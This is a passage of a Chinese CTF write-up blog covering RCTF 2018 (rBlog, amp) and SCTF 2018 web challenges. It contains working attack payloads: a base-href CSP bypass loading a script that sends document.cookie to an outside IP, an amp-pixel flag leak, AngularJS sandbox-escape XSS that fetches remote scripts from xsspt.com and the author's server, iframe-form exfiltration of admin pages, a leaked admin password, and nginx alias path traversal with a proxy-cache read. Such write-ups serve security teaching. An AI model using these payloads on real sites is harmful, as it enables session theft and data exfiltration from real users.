shrink-to-fit=no&quot;&gt;</span><br><span class=\"line\">\t&lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/bootstrap.min.css&quot;&gt;</span><br><span class=\"line\">\t&lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/style.css&quot;&gt;</span><br><span class=\"line\">\t&lt;link href=&quot;https://fonts.googleapis.com/css?family=Titillium+Web&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">\t&lt;title&gt;rBlog 2018&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div class=&quot;container mt-5&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;card&quot;&gt;</span><br><span class=\"line\">\t\t\t\t&lt;div class=&quot;card-body&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h2 class=&quot;card-title&quot;&gt;&lt;&gt;1&lt;/h2&gt;</span><br><span class=\"line\">\t\t\t&lt;p class=&quot;card-text&quot;&gt;&amp;lt;&amp;gt;2&lt;/p&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;script nonce=&quot;090c154a21d0fdf5809aff4586fe1eed&quot; src=&quot;/assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>title没有过滤，content过滤。</p>\n<p>csp如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-Frame-Options: DENY</span><br><span class=\"line\">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-3ae08923a2654e27a3734f7876a5abe0&apos;; frame-src https://www.google.com/recaptcha/; style-src &apos;self&apos; &apos;unsafe-inline&apos; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &apos;self&apos;</span><br></pre></td></tr></table></figure>\n<p>我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。</p>\n<p>所以payload如下:</p>\n<p>title: <code>&lt;base href =&quot;http://【my_server】/&quot;&gt;</code></p>\n<p>content: 随意</p>\n<p>在字节的vps上添加jquery.min.js，网址:           <code>http://[my_server]/assets/js/jquery.min.js</code></p>\n<p>jquery.min.js的内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href=&quot;http://123.207.90.143?&quot;+document.cookie;</span><br></pre></td></tr></table></figure>\n<p>最终结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">115.159.200.107 - - [22/May/2018:21:39:02 +0800] &quot;GET /?flag=RCTF&#123;why_the_heck_no_mimetype_for_webp_in_apache2_in_8012&#125;;%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1&quot; 200 15 &quot;http://rblog.2018.teamrois.cn/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"amp\"><a href=\"#amp\" class=\"headerlink\" title=\"amp\"></a>amp</h2><p>payload:</p>\n<blockquote>\n<p><a href=\"http://amp.2018.teamrois.cn?name=\" target=\"_blank\" rel=\"noopener\">http://amp.2018.teamrois.cn?name=</a><amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM_89_224_redhat ~]# nc -lvv 1234</span><br><span class=\"line\">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class=\"line\">Ncat: Listening on :::1234</span><br><span class=\"line\">Ncat: Listening on 0.0.0.0:1234</span><br><span class=\"line\">Ncat: Connection from 106.120.206.166.</span><br><span class=\"line\">Ncat: Connection from 106.120.206.166:64053.</span><br><span class=\"line\">\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����</span><br><span class=\"line\">                                 ��A It+z���^�vY�$���,�\u00183�&apos;�����*K�Zp&quot;jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5</span><br><span class=\"line\">\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010</span><br><span class=\"line\">              \u0002hhttp/1.1uP</span><br><span class=\"line\">                          \u0002\u00013+)jj\u0001\u001d �ZaV&gt;WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+</span><br><span class=\"line\"></span><br><span class=\"line\">��\u0017\u0003\u0003\u0003\u0002\u0003\u0001</span><br></pre></td></tr></table></figure>\n<p>writeup:</p>\n<blockquote>\n<p> <a href=\"https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\" target=\"_blank\" rel=\"noopener\">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>\n</blockquote>\n<p>注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。</p>"},{"title":"sctf2018","date":"2018-06-21T01:59:01.000Z","_content":"\n## 新的建议板\n\n<!--more-->\n\n1. 基础payload\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n   ```\n\n2. 打cookie\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n   ```\n\n3. 调用script\n\n   使用\n\n   > $.getScript('https://xsspt.com/HMTzMS')\n\n   > base64一下: `JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==`\n\n4. 这样就可以拿到cookie\n\n   接收到的内容如下:\n\n   ```\n   location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B'a'.constructor.prototype.charAt=[].join;$eval('x=1%7D%20%7D%20%7D;eval(atob(%5C'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C'))//');%7D%7D\n   ```\n\n5. cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。\n\n6. 获取`/admin`的内容\n\n   ```\n   JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n   =>\n   $.getScript('http://123.207.90.143/su.js')\n   ```\n\n   ```\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n   ```\n\n7. su.js内容即paylaod如下：\n\n   ```\n   $.ajax({\n       url: \"/admin\",\n       type: \"GET\",\n       dataType: \"text\",\n       success: function(result) {\n           var code = btoa(encodeURIComponent(result));\n           xssPost('http://123.207.90.143', code);\n       },\n       error: function(msg) {\n   \n       }\n   })\n   \n   function xssPost(url, postStr) {\n       var de;\n       de = document.body.appendChild(document.createElement('iframe'));\n       de.src = 'about:blank';\n       de.height = 1;\n       de.width = 1;\n       de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n       de.contentDocument.forms[0].submit();\n       de.style.display = 'none';\n   }\n   ```\n\n8. admin内容如下:\n\n   ```\n   JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n   ```\n\n   解码后:\n\n   ```\n   ...\n   <div class=\"container\">\n     <div class=\"jumbotron\">\n           <h1>HELLO adminClound</h1>\n           <p>新版后台2.0!</p>\n     </div>\n   </div>\n   ...\n   ```\n\n9. 获取`admin/file`，需要登录\n\n   ```\n   <div class=\"container\">\n     <form method=\"post\">\n       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label>\n       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required=\"\" autofocus=\"\" name=\"filepasswd\">\n       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n     </form>\n   </div>\n   ```\n\n10. 我们发现新的用户\n\n  ```\n  adminClound\n  ```\n\n  结合路由:\n\n  ```\n  http://116.62.137.114:4879/api/memos/admintest2313\n  ```\n\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n\n    ```\n    $.ajax({\n        url: \"/admin/file\",\n        type: \"POST\",\n        data: \"filepasswd=HGf%5E%2639NsslUIf%5E23\",\n        dataType: \"text\",\n        success: function(result) {\n            var code = btoa(encodeURIComponent(result));\n            xssPost('http://123.207.90.143', code);\n        },\n        error: function(msg) {\n    \n        }\n    })\n    \n    function xssPost(url, postStr) {\n        var de;\n        de = document.body.appendChild(document.createElement('iframe'));\n        de.src = 'about:blank';\n        de.height = 1;\n        de.width = 1;\n        de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n        de.contentDocument.forms[0].submit();\n        de.style.display = 'none';\n    }\n    \n    ```\n\n    得到flag:`sctf{T4is_is_f1ag2313}`。\n\n\n## nginx的秘密\n\n>hint4:/editxxxxx怎么也能访问? \n>\n>hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333 \n>\n>hint2:这个路由好生奇怪 \n>\n>hint1:从nginx的典型错误配置入手吧 \n\n### 目录穿越漏洞\n\n> -syc-note 我已经把所有秘密写进secret plan了233333 \n\n​ 需要读取secret plain\n\n首先可以发现nginx存在目录穿越漏洞，可以参考[https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration](https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration)。\n\n访问`http://116.62.137.155:4455/static../etc/nginx/nginx.conf> `，即可得到nginx.conf\n\n### 理解proxy_cache_path\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n  worker_connections 768;\n  # multi_accept on;\n}\n\nhttp {\n\n  ##\n  # Basic Settings\n  ##\n\n  sendfile on;\n  tcp_nopush on;\n  tcp_nodelay on;\n  keepalive_timeout 65;\n  types_hash_max_size 2048;\n  # server_tokens off;\n\n  # server_names_hash_bucket_size 64;\n  # server_name_in_redirect off;\n\n  include /etc/nginx/mime.types;\n  default_type application/octet-stream;\n\n  ##\n  # SSL Settings\n  ##\n\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE\n  ssl_prefer_server_ciphers on;\n\n  ##\n  # Logging Settings\n  ##\n\n  #access_log /var/log/nginx/access.log;\n  #error_log /var/log/nginx/error.log;\n\n  ##\n  # Gzip Settings\n  ##\n\n  gzip on;\n  gzip_disable \"msie6\";\n\n  # gzip_vary on;\n  # gzip_proxied any;\n  # gzip_comp_level 6;\n  # gzip_buffers 16 8k;\n  # gzip_http_version 1.1;\n  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\n  proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;\n  \n  limit_conn_zone $binary_remote_addr zone=conn:10m;\n  limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;\n\n  \n  server {\n      listen 4455 default_server;\n      server_name localhost;\n\n      location /static {\n          alias /home/;\n      }\n\n      location ~* \\.(css|js|gif|png){\n          proxy_cache             my_cache;\n          proxy_cache_valid       200 30s;\n          proxy_pass              http://bugweb.app:8000;\n          proxy_set_header        Host $host:$server_port;\n          proxy_ignore_headers    Expires Cache-Control Set-Cookie;\n      }\n\n      location / {\n          limit_conn conn 10;\n          proxy_pass       http://bugweb.app:8000;\n          proxy_set_header Host $host:$server_port;\n      }\n  }\n  ##\n  # Virtual Host Configs\n  ##\n\n  include /etc/nginx/conf.d/*.conf;\n  include /etc/nginx/sites-enabled/*;\n}\n\n\n#mail {\n# # See sample authentication script at:\n# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript\n# \n# # auth_http localhost/auth.php;\n# # pop3_capabilities \"TOP\" \"USER\";\n# # imap_capabilities \"IMAP4rev1\" \"UIDPLUS\";\n# \n# server {\n#   listen     localhost:110;\n#   protocol   pop3;\n#   proxy      on;\n# }\n# \n# server {\n#   listen     localhost:143;\n#   protocol   imap;\n#   proxy      on;\n# }\n#}\n```\n\n其中最重要的是这句话:\n\n```\nproxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;\n```\n\n匹配到~* .(css|js|gif|png)就进行缓存。\n\n查看文档<http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path> 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 \\$scheme\\$proxy_host\\$request_uri，即文件名形式为MD5(\\$scheme\\$proxy_host\\$request_uri),如果访问<http://116.62.137.155:4455/write_plan/a.js/> ，则缓存文件名为MD5(<http://bugweb.app:8000/write_plan/a.js/>) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。\n\n### 读取secret_plain\n\n由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造<http://116.62.137.155:4455/write_plan/a.js/> 提交给管理员访问， 管理员在查看该页面之后，也就相当于访问了管理员的`http://116.62.137.155:4455/write_plan`,并生成了缓存文件，这时候再读取缓存文件。\n\n`http://116.62.137.155:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b`\n\n```\n\u0003       嬹,[    m?[    ,R泻  ? \u000f\u0001                                                                                                      \nKEY: http://bugweb.app:8000/write_plan/a.js/\nHTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 3555\n\n<!DOCTYPE html>\n<html>\n  <head>\n\n    <title>post bug</title>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <!-- Bootstrap -->\n    <link href=\"//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">\n<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" type=\"image/x-icon\">\n<link rel=\"icon\" href=\"/static/favicon.ico\" type=\"image/x-icon\">\n\n  </head>\n  <body>\n    \n<div class=\"navbar navbar-inverse\" role=\"navigation\">\n    <div class=\"container\">\n        <div class=\"navbar-header\">\n            <button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\">\n                <span class=\"sr-only\">Toggle navigation</span>\n                <span class=\"icon-bar\"></span>\n                <span class=\"icon-bar\"></span>\n                <span class=\"icon-bar\"></span>\n            </button>\n            <a class=\"navbar-brand\" href=\"/\">Syc Work Notes</a>\n        </div>\n        <div class=\"navbar-collapse collapse\">\n            <ul class=\"nav navbar-nav\">\n                \n          <li><a href=\"/user/admin\">UserInfo</a></li>\n          <li><a href=\"/edit/\">EditMyinfo</a></li>\n                    <li><a href=\"/write_plan/\">Write_your_plan</a></li>\n                    <li><a 